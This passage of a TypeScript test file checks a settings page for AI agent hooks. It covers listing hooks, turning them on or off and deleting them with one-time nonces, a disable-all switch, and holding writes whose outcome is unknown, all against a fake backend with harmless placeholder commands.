// The hooks on a live page: the real core over a fake fetch and a scripted session manager. The settings chat opens when
// the section is shown, the list is read on it, every change mints its own one-time permission and is sent once, a lost answer is
// held until a fresh read proves it, and a hook whose settings file is not known is read only with the reason.
// eslint-disable-next-line no-restricted-imports -- a router harness for the table's URL state, not page code
import { createMemoryHistory, createRootRoute, createRouter, RouterProvider } from '@tanstack/react-router';
// eslint-disable-next-line no-restricted-imports -- a test harness, not page code
import { QueryClientProvider } from '@tanstack/react-query';
import { act, cleanup, render, screen, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { heldChanges, queryClient, refreshFresh, sourceReads, useCurrentComputer, useRealms } from '@core';
import { boot, calls, onFetch, settle, type Reply } from '@core/test/env';
import type { LeaseHandle, LeaseManager, LeaseRef } from '@kit';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { HooksSection } from './Hooks';
import { HOOKS_LOCK, HOOKS_SOURCE } from './hooksData';
import { PlaceBar, PlaceProvider, usePlace } from './Place';
import { useSettingsHold } from './data';
import { useHookWrite, useHooksList, type HookChange } from './hooksData';
import type { HookVars } from './hooksData';
import { createSettingsSessions, setSettingsSessionsForTests, type SessionApi, type SettingsSessions } from './Session';
import strings from './Hooks.strings.en.json';
import kitStates from '@kit/states/strings.en.json';
import editStrings from './HookEdit.strings.en.json';
import askStrings from './HookAsk.strings.en.json';
import featureStrings from './strings.en.json';
import { findHidden } from './hidden';
import trustStrings from './Trust.strings.en.json';
import rulesStrings from './Rules.strings.en.json';

const R1 = 'aaaaaaaaaaaaaaaaaaaaaaa1';
const FOLDER = '/home/ada/shop';
const U = '/home/ada/.hoody/settings.json';
const P = `${FOLDER}/.hoody/settings.json`;
const L = `${FOLDER}/.hoody/settings.local.json`;
type Hook = (c: { url: URL; method: string; body: Record<string, unknown> | null; headers: Record<string, string> }) => Reply | Promise<Reply> | undefined;
type Over = Partial<Record<'list' | 'begin' | 'toggle' | 'remove' | 'disable' | 'ack' | 'features', Hook>>;
let over: Over = {};
/** The body of the held notice; its title ("This may have gone through") is a second element, so the words alone match twice. */
const HELD = /Outcome unknown: a hook change .* may have gone through/;
let seq = 0;

interface H { event: string; matcher?: string; command: string; source: string; disabled?: boolean; label?: string; description?: string; when?: unknown }
let hooks: H[] = [];
let files: { scope: string; path: string; exists: boolean; sets_disable_all: boolean }[] = [];
let trust: Record<string, unknown> = { state: 'ok', hash: 'h1' };
let stale = false;
/** hooks_agent_self_trust as GET /settings/features answers it (shown on this card). */
let selfTrustOn = false;

const u = (s: string) => new URL(s);
const pathOf = (c: { url: string }) => u(c.url).pathname.split('/agent')[1] ?? '';
const writes = () => calls.filter((c) => c.method !== 'GET' && pathOf(c).startsWith('/hooks') && !pathOf(c).endsWith('/begin-write'));
const begins = () => calls.filter((c) => pathOf(c).endsWith('/hooks/begin-write'));
const lists = () => calls.filter((c) => c.method === 'GET' && pathOf(c) === '/hooks');
const flush = async () => { for (let i = 0; i < 20; i++) await act(async () => { await settle(); }); };

let created = 0;
let closed: string[] = [];
function sessions(): SettingsSessions {
  const api: SessionApi = {
    status: async () => ({ connected: true, account_id: 'acct', auth_active: true, owner_fingerprint: 'fp', restriction: 'none' }),
    version: async () => ({ session_protocol_version: 3, capabilities: ['turn_idempotency', 'session_state', 'gate_envelope', 'computer_binding'].map((name) => ({ name, supported: true, available: true })) }),
    create: async (a) => { created++; return { session_id: `s${created}`, started: { realm_selector: a.realm, computer_id: 'c1', owner_fingerprint: 'fp' } }; },
    close: async (_a, sid) => { closed.push(sid); },
  };
  const leases: LeaseManager = {
    track: (_ref: LeaseRef): LeaseHandle => ({ set: () => undefined, close: () => undefined }),
    ensure: async () => undefined,
    state: () => ({ phase: 'held' as never }),
    subscribe: () => () => undefined,
    forget: () => undefined,
    releaseAll: () => undefined,
    resume: () => undefined,
    reset: () => undefined,
  };
  let k = 0;
  return createSettingsSessions({ api, leases, newKey: () => `key-${++k}`, account: () => 'acct' });
}

function Host() {
  const target = useCurrentComputer();
  const realm = useRealms().selected;
  return target ? (
    <PlaceProvider target={target} realm={realm}>
      <PlaceBar computer="atlas" />
      <HooksSection computer="atlas" />
    </PlaceProvider>
  ) : null;
}
/** The toolbar's kill switch while it offers to turn hooks back on: the warn note above the table offers it too. */
const toolbarEnable = async (): Promise<HTMLElement> => {
  const all = await screen.findAllByRole('button', { name: strings.enableAll });
  const bar = all.filter((x) => x.closest('[role="alert"]') === null);
  expect(bar).toHaveLength(1);
  return bar[0]!;
};
async function show() {
  const router = createRouter({ routeTree: createRootRoute({ component: Host }), history: createMemoryHistory({ initialEntries: ['/ai/rules'] }) });
  await act(async () => {
    render(<QueryClientProvider client={queryClient}><RouterProvider router={router} /></QueryClientProvider>);
    await router.load();
  });
  await flush();
}
const listBody = () => ({
  status: 'ok',
  live: { total: hooks.length, hooks: hooks.map((h) => ({ matcher: '', ...h })) },
  session: {},
  stale,
  files,
  trust,
});
const row = (el: HTMLElement): HTMLElement => {
  let n: HTMLElement | null = el;
  while (n && !n.querySelector('[data-row-menu]')) n = n.parentElement;
  return n as HTMLElement;
};
const rowMenu = async (text: string, item: string) => {
  await userEvent.click(row(await screen.findByText(text)).querySelector('[data-row-menu] button') as HTMLElement);
  await userEvent.click(await screen.findByRole('menuitem', { name: new RegExp(item) }));
};
const goFolder = async () => {
  await userEvent.click(await screen.findByRole('radio', { name: rulesStrings['place.folder'] }));
  await flush();
};

let mgr: SettingsSessions;
beforeEach(() => {
  boot({ realm: R1 });
  queryClient.clear();
  over = {};
  selfTrustOn = false;
  seq = 0;
  created = 0;
  closed = [];
  stale = false;
  trust = { state: 'ok', hash: 'h1' };
  files = [
    { scope: 'user', path: U, exists: true, sets_disable_all: false },
    { scope: 'project', path: P, exists: true, sets_disable_all: false },
    { scope: 'local', path: L, exists: false, sets_disable_all: false },
  ];
  hooks = [
    { event: 'PreToolUse', matcher: 'Bash', command: './guard.sh', source: U, label: 'Guard shell' },
    { event: 'Stop', command: 'notify-send done', source: U, disabled: true },
  ];
  mgr = sessions();
  setSettingsSessionsForTests(mgr);
  onFetch((c) => {
    const url = u(c.url);
    const p = pathOf(c);
    const x = { url, method: c.method, body: c.body as Record<string, unknown> | null, headers: c.headers };
    const hit = (k: keyof Over, d: () => Reply): Reply | Promise<Reply> => over[k]?.(x) ?? d();
    if (p.endsWith('/sessions/cwds')) return { status: 200, body: { cwds: [FOLDER] } };
    if (p.endsWith('/settings/features')) {
      return hit('features', () => ({ status: 200, body: { features: [
        { name: 'account_rotation', value: true, default: true, set: false, writable: true },
        { name: 'hooks_agent_self_trust', value: selfTrustOn, default: false, set: false, writable: false },
      ] } }));
    }
    if (p.endsWith('/hooks/begin-write')) return hit('begin', () => ({ status: 200, body: { status: 'ok', nonce: `nonce-${++seq}`, op: c.body?.op, scope: c.body?.scope } }));
    if (p.endsWith('/hooks/toggle')) {
      return hit('toggle', () => {
        const b = c.body!;
        hooks = hooks.map((h) => (h.event === b.event && (h.matcher ?? '') === (b.matcher ?? '') && h.command === b.command ? { ...h, disabled: b.disabled === true } : h));
        return { status: 200, body: { status: 'ok' } };
      });
    }
    if (p.endsWith('/hooks/trust/ack')) {
      // The agent's own rules: the hash must be the live one, and high_risk is required exactly
      // when the set has unverifiable targets. Every refusal is the same bare 400.
      return hit('ack', () => {
        const b = c.body!;
        const risky = Array.isArray(trust.unverifiable) && trust.unverifiable.length > 0;
        if (trust.state !== 'pending' || b.hash !== trust.hash || b.high_risk !== risky) return { status: 400, body: { error: 'refused', code: 'bad_request' } };
        trust = { state: 'ok', hash: b.hash, unverifiable: trust.unverifiable, acked_by: 'api:s1' };
        return { status: 200, body: { status: 'ok', trust: { state: 'ok', hash: b.hash } } };
      });
    }
    if (p.endsWith('/hooks/disable-all')) {
      return hit('disable', () => {
        files = files.map((f) => (f.scope === c.body?.scope ? { ...f, sets_disable_all: c.body?.value === true } : f));
        return { status: 200, body: { status: 'ok' } };
      });
    }
    if (p.endsWith('/hooks') && c.method === 'DELETE') {
      return hit('remove', () => {
        const b = c.body!;
        hooks = hooks.filter((h) => !(h.event === b.event && (h.matcher ?? '') === (b.matcher ?? '') && h.command === b.command));
        return { status: 200, body: { status: 'ok' } };
      });
    }
    if (p.endsWith('/hooks') && c.method === 'GET') return hit('list', () => ({ status: 200, body: listBody() }));
    if (p.endsWith('/hooks/rules')) return { status: 200, body: { status: 'ok', rules: { live: [], scopes: [], rules_complete: true } } };
    return { status: 404, body: {} };
  });
});
afterEach(() => { cleanup(); mgr.reset(); setSettingsSessionsForTests(null); });

describe('hooks: opening and listing', () => {
  it('opens ONE settings chat, then lists the hooks on it', async () => {
    await show();
    expect(await screen.findByText('Guard shell')).toBeInTheDocument();
    expect(created).toBe(1);
    expect(lists()).toHaveLength(1);
    expect(u(lists()[0]!.url).searchParams.get('session_id')).toBe('s1');
    expect(writes()).toHaveLength(0);
    expect(begins()).toHaveLength(0);
  });
  it('leaving closes the chat', async () => {
    await show();
    await screen.findByText('Guard shell');
    cleanup();
    await flush();
    expect(closed).toEqual(['s1']);
  });
  it('shows what each hook runs on and its state, in words', async () => {
    await show();
    expect(await screen.findByText('Before a tool runs (Bash)')).toBeInTheDocument();
    expect(screen.getByText('When the agent finishes a turn (any tool)')).toBeInTheDocument();
    expect(screen.getAllByText(strings['state.on']).length).toBeGreaterThan(0);
    expect(screen.getAllByText(strings['state.off']).length).toBeGreaterThan(0);
  });
  it('with no hooks the table says so in its own empty state (no note above an empty table)', async () => {
    hooks = [];
    await show();
    const title = await screen.findByText(strings['empty.title']);
    // the table's own empty state (kit DataTable), not a note drawn above it
    const box = title.closest('[data-dataview-empty]') as HTMLElement | null;
    expect(box).not.toBeNull();
    expect(title.closest('[role="alert"], [role="status"]')).toBeNull();
    expect(within(box!).getByText(strings['empty.body'])).toBeInTheDocument();
    expect(screen.queryByRole('columnheader')).toBeNull();
  });
  it('with no hooks the first one is added from the empty state (the kit draws no toolbar then)', async () => {
    hooks = [];
    await show();
    const box = (await screen.findByText(strings['empty.title'])).closest('[data-dataview-empty]') as HTMLElement;
    const add = await within(box).findByRole('button', { name: strings.add });
    await vi.waitFor(() => expect(add).not.toBeDisabled());
    await userEvent.click(add);
    // Add asks how first; by hand is the hook editor.
    await userEvent.click(await screen.findByRole('button', { name: new RegExp(`^${askStrings['how.self']}`) }));
    expect(await screen.findByRole('dialog', { name: editStrings['title.add'] })).toBeInTheDocument();
  });
  it('Add hook asks how: with the Agent opens its own step, which writes nothing; by hand is the hook editor', async () => {
    hooks = [];
    await show();
    const box = (await screen.findByText(strings['empty.title'])).closest('[data-dataview-empty]') as HTMLElement;
    const add = await within(box).findByRole('button', { name: strings.add });
    await vi.waitFor(() => expect(add).not.toBeDisabled());
    await userEvent.click(add);
    const how = await screen.findByRole('dialog', { name: askStrings['how.title'] });
    expect(within(how).getByRole('button', { name: new RegExp(`^${askStrings['how.self']}`) })).toBeInTheDocument();
    await userEvent.click(within(how).getByRole('button', { name: new RegExp(`^${askStrings['how.agent']}`) }));
    const ask = await screen.findByRole('dialog', { name: askStrings['ask.title'] });
    expect(within(ask).getByRole('textbox', { name: new RegExp(`^${askStrings['ask.text']}`) })).toBeInTheDocument();
    expect(screen.queryByRole('dialog', { name: editStrings['title.add'] })).toBeNull();
    expect(writes()).toHaveLength(0);
  });
  it('with no hooks and the switch on, the all-off note still offers to turn hooks back on', async () => {
    hooks = [];
    files = files.map((f) => (f.scope === 'user' ? { ...f, sets_disable_all: true } : f));
    await show();
    const note = (await screen.findByText(/All hooks are turned off in This realm/)).closest('[role="alert"]') as HTMLElement;
    await userEvent.click(await within(note).findByRole('button', { name: strings.enableAll }));
    expect(await screen.findByRole('dialog', { name: strings['dis.titleOn'] })).toBeInTheDocument();
  });
  it('with no hooks, a change whose answer is lost locks the empty state\'s Add hook: no dialog, no write', async () => {
    hooks = [];
    files = files.map((f) => (f.scope === 'user' ? { ...f, sets_disable_all: true } : f));
    over.disable = () => ({ status: 0, network: true });
    await show();
    const note = (await screen.findByText(/All hooks are turned off in This realm/)).closest('[role="alert"]') as HTMLElement;
    await userEvent.click(await within(note).findByRole('button', { name: strings.enableAll }));
    await userEvent.click(within(await screen.findByRole('dialog')).getByRole('button', { name: strings['dis.confirmOn'] }));
    await screen.findByText(HELD);
    const sent = writes().length;
    const box = (await screen.findByText(strings['empty.title'])).closest('[data-dataview-empty]') as HTMLElement;
    const add = within(box).getByRole('button', { name: strings.add });
    expect(add).toBeDisabled();
    await userEvent.setup({ pointerEventsCheck: 0 }).click(add);
    await flush();
    expect(screen.queryByRole('dialog', { name: editStrings['title.add'] })).toBeNull();
    expect(writes().length).toBe(sent);
  });
  it('an answer that cannot be read as a whole shows nothing rather than part of the list', async () => {
    over.list = () => ({ status: 200, body: { status: 'ok', live: { hooks: [{ event: 'Stop' }] }, files } });
    await show();
    expect(await screen.findByText(strings['unreadable.title'])).toBeInTheDocument();
  });
  it('a lost session (the list says 404) is replaced once and the list is read again on the new chat', async () => {
    let first = true;
    over.list = () => {
      if (first) { first = false; return { status: 404, body: { error: 'x', code: 'not_found' } }; }
      return undefined;
    };
    await show();
    expect(await screen.findByText('Guard shell')).toBeInTheDocument();
    expect(created).toBe(2);
    expect(lists().map((c) => u(c.url).searchParams.get('session_id'))).toEqual(['s1', 's2']);
  });
  it('a session lost twice is shown as an error, not a loop', async () => {
    over.list = () => ({ status: 404, body: { error: 'x', code: 'not_found' } });
    await show();
    await flush();
    expect(created).toBeLessThanOrEqual(2);
    expect(screen.queryByText('Guard shell')).toBeNull();
  });
  it('says what the agent says: kill switch, stale chats, trust held', async () => {
    files = files.map((f) => (f.scope === 'user' ? { ...f, sets_disable_all: true } : f));
    stale = true;
    trust = { state: 'pending', hash: 'h', reason: 'a hook changed' };
    await show();
    await screen.findByText('Guard shell');
    expect(screen.getByText(/All hooks are turned off in This realm/)).toBeInTheDocument();
    expect(screen.getByText(strings.stale)).toBeInTheDocument();
    expect(screen.getByText(/held until someone reviews them \(a hook changed\)/)).toBeInTheDocument();
  });
});

async function stopTracking() {
  await userEvent.click(screen.getByRole('button', { name: kitStates['err.stopTracking'] }));
  await userEvent.click(within(await screen.findByRole('alertdialog')).getByRole('button', { name: strings['stop.confirm'] }));
  await flush();
}

describe('hooks: turning a hook on or off', () => {
  it('mints a nonce for op toggle on the user scope, then sends the hook named exactly with the state asked', async () => {
    await show();
    await screen.findByText('Guard shell');
    await rowMenu('Guard shell', strings.turnOff);
    await flush();
    expect(begins()).toHaveLength(1);
    expect(begins()[0]!.body).toMatchObject({ session_id: 's1', op: 'toggle', scope: 'user' });
    const w = writes();
    expect(w).toHaveLength(1);
    expect(w[0]!.method).toBe('POST');
    expect(w[0]!.body).toEqual({ session_id: 's1', nonce: 'nonce-1', scope: 'user', event: 'PreToolUse', matcher: 'Bash', command: './guard.sh', disabled: true });
    expect(await screen.findByText(strings.done)).toBeInTheDocument();
  });
  it('a hook that is off is turned on with disabled false; the wildcard group sends no matcher', async () => {
    await show();
    await rowMenu('notify-send done', strings.turnOn);
    await flush();
    const b = writes()[0]!.body;
    expect(b).toMatchObject({ event: 'Stop', command: 'notify-send done', disabled: false });
    expect('matcher' in b).toBe(false);
  });
  it('a hook as long as the agent takes (4096-unit matcher and command) is turned off and deleted: the hold records a digest, never the text', async () => {
    const matcher = 'M'.repeat(4096), command = 'c'.repeat(4096);
    hooks = [{ event: 'PreToolUse', matcher, command, source: U, label: 'Long hook' }];
    await show();
    await rowMenu('Long hook', strings.turnOff);
    await flush();
    expect(writes()).toHaveLength(1);
    expect(writes()[0]!.body).toEqual({ session_id: 's1', nonce: 'nonce-1', scope: 'user', event: 'PreToolUse', matcher, command, disabled: true });
    await rowMenu('Long hook', strings.delete.replace('…', ''));
    await userEvent.click(within(await screen.findByRole('alertdialog')).getByRole('button', { name: strings['del.confirm'] }));
    await flush();
    expect(writes()).toHaveLength(2);
    expect(writes()[1]!.body).toMatchObject({ event: 'PreToolUse', matcher, command });
  });
  it('a second change mints a new nonce on the same chat', async () => {
    await show();
    await rowMenu('Guard shell', strings.turnOff);
    await flush();
    await rowMenu('notify-send done', strings.turnOn);
    await flush();
    expect(created).toBe(1);
    expect(writes().map((c) => c.body!.nonce)).toEqual(['nonce-1', 'nonce-2']);
  });
  it('a refused nonce (409) says nothing was changed and is not resent', async () => {
    over.toggle = () => ({ status: 409, body: { error: 'x', code: 'write_intent_invalid' } });
    await show();
    await rowMenu('Guard shell', strings.turnOff);
    await flush();
    expect(await screen.findByText(strings['refused.write_intent_invalid'])).toBeInTheDocument();
    expect(writes()).toHaveLength(1);
  });
  it('a nonce that could not be minted sends no write', async () => {
    over.begin = () => ({ status: 503, body: { error: 'x', code: 'unavailable' } });
    await show();
    await rowMenu('Guard shell', strings.turnOff);
    await flush();
    expect(writes()).toHaveLength(0);
    expect(screen.queryByText(HELD)).toBeNull();
  });
  it('a lost answer is held: nothing is resent, no done, and the other rows wait', async () => {
    over.toggle = () => ({ status: 0, network: true });
    await show();
    await rowMenu('Guard shell', strings.turnOff);
    await flush();
    expect(await screen.findByText(HELD)).toBeInTheDocument();
    expect(writes()).toHaveLength(1);
    expect(screen.queryByText(strings.done)).toBeNull();
  });
  it('Check reads the list but frees nothing, even when the list shows the state asked for: only Stop tracking ends the hold; nothing is ever sent again', async () => {
    over.toggle = (c) => {
      hooks = hooks.map((h) => (h.command === './guard.sh' ? { ...h, disabled: c.body?.disabled === true } : h));
      return { status: 0, network: true };
    };
    await show();
    await rowMenu('Guard shell', strings.turnOff);
    await screen.findByText(HELD);
    const before = lists().length;
    await userEvent.click(screen.getByRole('button', { name: /Check again/ }));
    await flush();
    expect(lists().length).toBeGreaterThan(before);
    expect(screen.getByText(HELD)).toBeInTheDocument();
    await stopTracking();
    expect(screen.queryByText(HELD)).toBeNull();
    expect(writes()).toHaveLength(1);
    expect(begins()).toHaveLength(1);
  });
  it('an applied toggle whose answer was lost stays held: a read by anyone else and a Check again free nothing', async () => {
    over.toggle = (c) => {
      // the agent applied it, the answer never arrived
      hooks = hooks.map((h) => (h.command === './guard.sh' ? { ...h, disabled: c.body?.disabled === true } : h));
      return { status: 0, network: true };
    };
    await show();
    await rowMenu('Guard shell', strings.turnOff);
    await screen.findByText(HELD);
    await act(async () => { await refreshFresh(sourceReads(HOOKS_SOURCE, ['hooks'])); });
    await flush();
    expect(screen.getByText(HELD)).toBeInTheDocument();
    await userEvent.click(screen.getByRole('button', { name: /Check again/ }));
    await flush();
    expect(screen.getByText(HELD)).toBeInTheDocument();
    expect(writes()).toHaveLength(1);
  });
  it('a Check again whose read is cancelled by another fresh read, with every reply blocked, frees nothing: the cache is not a confirmation', async () => {
    over.toggle = (c) => {
      hooks = hooks.map((h) => (h.command === './guard.sh' ? { ...h, disabled: c.body?.disabled === true } : h));
      return { status: 0, network: true };
    };
    await show();
    await rowMenu('Guard shell', strings.turnOff);
    await screen.findByText(HELD);
    const waiting: (() => void)[] = [];
    over.list = () => new Promise<Reply>((res) => { waiting.push(() => res({ status: 200, body: listBody() })); });
    await userEvent.click(screen.getByRole('button', { name: /Check again/ }));
    void refreshFresh(sourceReads(HOOKS_SOURCE, ['hooks']), { own: true }).catch(() => undefined);
    await flush();
    expect(screen.getByText(HELD)).toBeInTheDocument();
    // answers that arrive later were not asked for by this press's read: still held
    waiting.splice(0).forEach((f) => f());
    await flush();
    expect(screen.getByText(HELD)).toBeInTheDocument();
    expect(writes()).toHaveLength(1);
  });
});

describe('hooks: deleting a hook', () => {
  it('asks first, naming the command, and sends a DELETE with the hook in its body', async () => {
    await show();
    await rowMenu('Guard shell', strings.delete.replace('…', ''));
    const dlg = await screen.findByRole('alertdialog');
    expect(within(dlg).getByText('./guard.sh')).toBeInTheDocument();
    expect(writes()).toHaveLength(0);
    await userEvent.click(within(dlg).getByRole('button', { name: strings['del.confirm'] }));
    await flush();
    expect(begins()[0]!.body).toMatchObject({ op: 'delete', scope: 'user' });
    const w = writes();
    expect(w).toHaveLength(1);
    expect(w[0]!.method).toBe('DELETE');
    expect(w[0]!.body).toEqual({ session_id: 's1', nonce: 'nonce-1', scope: 'user', event: 'PreToolUse', matcher: 'Bash', command: './guard.sh' });
  });
  it('cancelling sends nothing', async () => {
    await show();
    await rowMenu('Guard shell', strings.delete.replace('…', ''));
    const dlg = await screen.findByRole('alertdialog');
    await userEvent.click(within(dlg).getByRole('button', { name: /Cancel/ }));
    await flush();
    expect(begins()).toHaveLength(0);
    expect(writes()).toHaveLength(0);
  });
  it('a lost delete is held: a list without the hook frees nothing; Stop tracking does', async () => {
    over.remove = () => ({ status: 0, network: true });
    await show();
    await rowMenu('Guard shell', strings.delete.replace('…', ''));
    await userEvent.click(within(await screen.findByRole('alertdialog')).getByRole('button', { name: strings['del.confirm'] }));
    await screen.findByText(HELD);
    hooks = hooks.filter((h) => h.command !== './guard.sh');
    await userEvent.click(screen.getByRole('button', { name: /Check again/ }));
    await flush();
    expect(screen.getByText(HELD)).toBeInTheDocument();
    await stopTracking();
    expect(screen.queryByText(HELD)).toBeNull();
    expect(writes()).toHaveLength(1);
  });
});

describe('hooks: disabling all hooks', () => {
  it('is a red confirm that says what stops, then sends the value true for the file', async () => {
    await show();
    await userEvent.click(await screen.findByRole('button', { name: strings.disableAll }));
    const dlg = await screen.findByRole('dialog');
    expect(dlg).toHaveAttribute('data-hub-overlay', 'ai-hooks-switch'); // the confirm names its overlay
    expect(within(dlg).getByText(/turns on the switch for all hooks in This realm.*including hooks saved in other files/)).toBeInTheDocument();
    expect(writes()).toHaveLength(0);
    await userEvent.click(within(dlg).getByRole('button', { name: strings['dis.confirm'] }));
    await flush();
    expect(begins()[0]!.body).toMatchObject({ op: 'set_disabled', scope: 'user' });
    expect(writes()[0]!.method).toBe('POST');
    expect(writes()[0]!.body).toEqual({ session_id: 's1', nonce: 'nonce-1', scope: 'user', value: true });
  });
  it('when the switch is already on the same button turns hooks back on and sends the value false', async () => {
    files = files.map((f) => (f.scope === 'user' ? { ...f, sets_disable_all: true } : f));
    await show();
    await userEvent.click(await toolbarEnable());
    const dlg = await screen.findByRole('dialog');
    await userEvent.click(within(dlg).getByRole('button', { name: strings['dis.confirmOn'] }));
    await flush();
    expect(writes()[0]!.body).toMatchObject({ scope: 'user', value: false });
  });
  it('a lost disable all is held: a list showing the switch on frees nothing; Stop tracking does', async () => {
    over.disable = () => ({ status: 0, network: true });
    await show();
    await userEvent.click(await screen.findByRole('button', { name: strings.disableAll }));
    await userEvent.click(within(await screen.findByRole('dialog')).getByRole('button', { name: strings['dis.confirm'] }));
    await screen.findByText(HELD);
    files = files.map((f) => (f.scope === 'user' ? { ...f, sets_disable_all: true } : f));
    await userEvent.click(screen.getByRole('button', { name: /Check again/ }));
    await flush();
    expect(screen.getByText(HELD)).toBeInTheDocument();
    await stopTracking();
    expect(screen.queryByText(HELD)).toBeNull();
    expect(writes()).toHaveLength(1);
  });
  it('a lost re-enable is held the same way: a list with the switch off frees nothing', async () => {
    files = files.map((f) => (f.scope === 'user' ? { ...f, sets_disable_all: true } : f));
    over.disable = () => ({ status: 0, network: true });
    await show();
    await userEvent.click(await toolbarEnable());
    await userEvent.click(within(await screen.findByRole('dialog')).getByRole('button', { name: strings['dis.confirmOn'] }));
    await screen.findByText(HELD);
    files = files.map((f) => (f.scope === 'user' ? { ...f, sets_disable_all: false } : f));
    await userEvent.click(screen.getByRole('button', { name: /Check again/ }));
    await flush();
    expect(screen.getByText(HELD)).toBeInTheDocument();
  });
});

describe('hooks: read only', () => {
  it('a hook whose settings file is not known cannot be changed, and says why', async () => {
    hooks = [{ event: 'Stop', command: 'mystery', source: '/elsewhere/settings.json' }];
    await show();
    await screen.findByText('mystery');
    expect(await screen.findByText(strings['readonly.unplaced'])).toBeInTheDocument();
    await userEvent.click(row(screen.getByText('mystery')).querySelector('[data-row-menu] button') as HTMLElement);
    expect(await screen.findByRole('menuitem', { name: new RegExp(strings.turnOff) })).toHaveAttribute('aria-disabled', 'true');
    expect(writes()).toHaveLength(0);
  });
  it('a folder hook is read only in the Realm place and changeable in the folder place, in its own scope', async () => {
    hooks = [{ event: 'Stop', command: 'project-hook', source: P }];
    await show();
    await screen.findByText('project-hook');
    expect(await screen.findByText(strings['readonly.folder'])).toBeInTheDocument();
    await goFolder();
    await rowMenu('project-hook', strings.turnOff);
    await flush();
    expect(begins()[0]!.body).toMatchObject({ op: 'toggle', scope: 'project' });
    expect(writes()[0]!.body).toMatchObject({ scope: 'project', command: 'project-hook', disabled: true });
  });
});

describe('hooks: the place', () => {
  it('moving to a folder closes the chat of the old place and lists on a new one', async () => {
    await show();
    await screen.findByText('Guard shell');
    await goFolder();
    await screen.findByText('Guard shell');
    expect(closed).toEqual(['s1']);
    expect(created).toBe(2);
    expect(lists().map((c) => u(c.url).searchParams.get('session_id'))).toEqual(['s1', 's2']);
  });
});

// ---- identity, refusals, the kill switch and holds ----
describe('hooks: identity, what a write may name', () => {
  it('a hook with an empty command is read-only and sends nothing; its sibling in the same group is changeable', async () => {
    hooks = [
      { event: 'PreToolUse', matcher: 'Bash', command: '', source: U, label: 'No command' },
      { event: 'PreToolUse', matcher: 'Bash', command: './sibling.sh', source: U, label: 'Sibling' },
    ];
    await show();
    await screen.findByText('Sibling');
    expect(await screen.findByText(strings['readonly.empty'])).toBeInTheDocument();
    await userEvent.click(row(screen.getByText('No command')).querySelector('[data-row-menu] button') as HTMLElement);
    expect(await screen.findByRole('menuitem', { name: new RegExp(strings.delete.replace('…', '')) })).toHaveAttribute('aria-disabled', 'true');
    expect(await screen.findByRole('menuitem', { name: new RegExp(strings.turnOff) })).toHaveAttribute('aria-disabled', 'true');
    expect(writes()).toHaveLength(0);
    expect(begins()).toHaveLength(0);
  });
  it('Bash and bash with one command in one file are one hook to the agent: both rows are read-only (twin) and send nothing', async () => {
    hooks = [
      { event: 'PreToolUse', matcher: 'Bash', command: './guard.sh', source: U, label: 'First' },
      { event: 'PreToolUse', matcher: 'bash', command: './guard.sh', source: U, label: 'Second' },
    ];
    await show();
    await screen.findByText('Second');
    expect(await screen.findByText(strings['readonly.twin'])).toBeInTheDocument();
    for (const name of ['First', 'Second']) {
      await userEvent.click(row(screen.getByText(name)).querySelector('[data-row-menu] button') as HTMLElement);
      expect(await screen.findByRole('menuitem', { name: new RegExp(strings.turnOff) })).toHaveAttribute('aria-disabled', 'true');
      await userEvent.keyboard('{Escape}');
    }
    expect(writes()).toHaveLength(0);
    expect(begins()).toHaveLength(0);
  });
  it('Bash and a matcher with U+0085 (Go trims it, JavaScript does not) are one hook to the agent: both rows are read-only and send nothing', async () => {
    hooks = [
      { event: 'PreToolUse', matcher: 'Bash', command: './guard.sh', source: U, label: 'First' },
      { event: 'PreToolUse', matcher: '\u0085Bash\u0085', command: './guard.sh', source: U, label: 'Second' },
    ];
    await show();
    await screen.findByText('Second');
    expect(await screen.findByText(strings['readonly.ascii'])).toBeInTheDocument();
    expect(await screen.findByText(strings['readonly.twin'])).toBeInTheDocument();
    for (const name of ['First', 'Second']) {
      await userEvent.click(row(screen.getByText(name)).querySelector('[data-row-menu] button') as HTMLElement);
      expect(await screen.findByRole('menuitem', { name: new RegExp(strings.turnOff) })).toHaveAttribute('aria-disabled', 'true');
      expect(await screen.findByRole('menuitem', { name: new RegExp(strings.delete.replace('…', '')) })).toHaveAttribute('aria-disabled', 'true');
      await userEvent.keyboard('{Escape}');
    }
    expect(writes()).toHaveLength(0);
    expect(begins()).toHaveLength(0);
  });
  it('two matchers sharing their first 1024 characters are two hooks; the long one is deleted by its whole matcher', async () => {
    const m = 'm'.repeat(1024);
    hooks = [
      { event: 'PreToolUse', matcher: m, command: 'same.sh', source: U, label: 'Short group' },
      { event: 'PreToolUse', matcher: m + 'x', command: 'same.sh', source: U, label: 'Long group' },
    ];
    await show();
    await rowMenu('Long group', strings.delete.replace('…', ''));
    await userEvent.click(within(await screen.findByRole('alertdialog')).getByRole('button', { name: strings['del.confirm'] }));
    await flush();
    expect(writes()).toHaveLength(1);
    expect(writes()[0]!.body!.matcher).toBe(m + 'x');
    expect(hooks.map((h) => h.label)).toEqual(['Short group']);
  });
});

describe('hooks: a refusal is a refusal', () => {
  it('a hook the agent cannot find (404 not_found) is refused once: one nonce, one write, one chat, never resent', async () => {
    over.toggle = () => ({ status: 404, body: { error: 'no hook found', code: 'not_found' } });
    await show();
    await rowMenu('Guard shell', strings.turnOff);
    await flush();
    expect(await screen.findByText(strings['refused.not_found'])).toBeInTheDocument();
    expect(begins()).toHaveLength(1);
    expect(writes()).toHaveLength(1);
    expect(created).toBe(1);
    expect(closed).toEqual([]);
    // the list is read again
    expect(lists().length).toBeGreaterThanOrEqual(2);
  });
  it('a refused disable all stays visible after its dialog closes', async () => {
    over.disable = () => ({ status: 409, body: { error: 'x', code: 'write_intent_invalid' } });
    await show();
    await userEvent.click(await screen.findByRole('button', { name: strings.disableAll }));
    await userEvent.click(within(await screen.findByRole('dialog')).getByRole('button', { name: strings['dis.confirm'] }));
    await flush();
    expect(await screen.findByText(strings['refused.write_intent_invalid'])).toBeInTheDocument();
    expect(screen.queryByRole('dialog')).toBeNull();
    expect(writes()).toHaveLength(1);
  });
  it('a nonce that could not be minted for disable all says nothing was changed, in view', async () => {
    over.begin = () => ({ status: 503, body: { error: 'x', code: 'unavailable' } });
    await show();
    await userEvent.click(await screen.findByRole('button', { name: strings.disableAll }));
    await userEvent.click(within(await screen.findByRole('dialog')).getByRole('button', { name: strings['dis.confirm'] }));
    await flush();
    expect(screen.queryByRole('dialog')).toBeNull();
    expect((await screen.findAllByText(/Nothing was sent/)).length).toBeGreaterThan(0);
    expect(writes()).toHaveLength(0);
  });
});

describe('hooks: the Hooks card', () => {
